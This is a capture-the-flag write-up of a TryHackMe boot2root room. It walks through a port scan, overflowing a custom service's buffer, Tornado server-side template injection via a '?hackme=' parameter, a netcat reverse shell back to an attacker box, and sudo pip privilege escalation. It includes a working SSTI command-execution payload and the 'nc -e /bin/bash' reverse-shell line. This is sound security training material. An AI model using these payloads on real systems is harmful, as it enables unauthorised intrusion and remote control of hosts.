# NoNameCTF

A relatively simple boot2root.

A scan revealed:

```
PORT     STATE SERVICE       REASON  VERSION
22/tcp   open  ssh           syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http          syn-ack Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  EtherNetIP-1? syn-ack
9090/tcp open  http          syn-ack Tornado httpd 6.0.3
```

On 80 was a simple static page, that contained in its source:

```
<html>
<head></head>
<body>
<!--char buffer[250]; -->
<!--A*1000-->
        checkme!
</body>
</html>
```

Some indication of a buffer overflow? On port 9090, the 'Tornado' framework was running, but just returning an error on the root index:

```
Traceback (most recent call last):
  File "/home/zeldris/.local/lib/python3.5/site-packages/tornado/web.py", line 1676, in _execute
    result = self.prepare()
  File "/home/zeldris/.local/lib/python3.5/site-packages/tornado/web.py", line 2431, in prepare
    raise HTTPError(self._status_code)
tornado.web.HTTPError: HTTP 404: Not Found
```

Its annoying when CTFs do this, as its initially unclear if this is intended or its just broken. In this instance, it was the former.

So with the two websites not going anywhere, I examined port 2222. It wasn't ssh - by going to it with `nc <ip> 2222`, it would present an option menu:

```
Welcome to the NoNameCTF!
Choose an action:
> regiser: 1
> login: 2
> get_secret_directory: 3
> store_your_buffer: 4
```

By registering and logging in, I could then use the 'store_your_buffer' option. This looked like a buffer overflow, albeit a very uncomplicated one. All that was required it seemed (and later confirmed) was to overflow the buffer - doing so would then cause the problem to return a directory path on the get_secret_directory option. So I shoved 10000 chars in there (generated via `cyclic 10000`) and the get_secret_directory option returned a `/<secret guid-like path>/`.

On that page was some generic text from the tryhackme website, and in the source a hint:

```
<html>
 <head><title> Hello</title></head>
 <body><section class="inside"><h2>Cyber Security training made easy</h2></br>Hello zeldris
 <p class='m0'>TryHackMe takes the pain out of learning and teaching Cybersecurity. Our platform makes it a comfortable experience to learn by designing prebuilt courses which include virtual machines (VM) hosted in the cloud ready to be deployed. This avoids the hassle of downloading and configuring VM's. Our platform is perfect for CTFs, Workshops, Assessments or Training.</p></section></section></div><div class="container main pb"><section class="row"><div class="col-md-4 green-hover"><h2><i class="fas fa-spider"></i> Hack Instantly</h2><p>Learn, practice and complete! Get hands on and practise your skills in a real-world environment by completing fun and difficult tasks. You can deploy VMs, which will give an IP address instantly and away you go.</p></div><div class="col-md-4 green-hover"><h2><i class="fas fa-door-closed"></i> Rooms</h2><p>Rooms are virtual areas dedicated to particular cyber security topics. For example, a room called "Hacking the Web" could be dedicated to web application vulnerabilities. </p></div><div class="col-md-4 green-hover"><h2><i class="fab fa-fort-awesome"></i> Tasks</h2><p>Each room has tasks that contain questions and hints, a custom leaderboard and chat area. Whilst you're hacking away, you can discuss hacking techniques or request help from others.</p><!-- ?hackme= --></div></section> 
</body>
</html>
```

By putting `?hackme=` on the url, I could get it to show up after 'Hello'. Given this room is listed with SSTI mentioned, I tried `{{2*4}}` and got 'Hello 8' showing up.

Tornado has its own template language, so I used this article to get an idea on how to explicit this: https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/. I found this would work: `?hackme={%%20import%20os%20%}{{%20os.popen("whoami").read()%20}}`, revealing the user was 'zeldris'.

Using `whereis nc` I found the server had 'nc.traditional', so I used the simple `nc -e /bin/bash <attack ip> 4444` and a nc listener on my attack box to get a reverse shell as zeldris and the **user flag**.

`sudo -l` revealed:

```
User zeldris may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/pip install *
```

pip was listed on gtfo bins here: https://gtfobins.github.io/gtfobins/pip/#sudo

I used this technique to quickly achieve root and get the **root flag**.
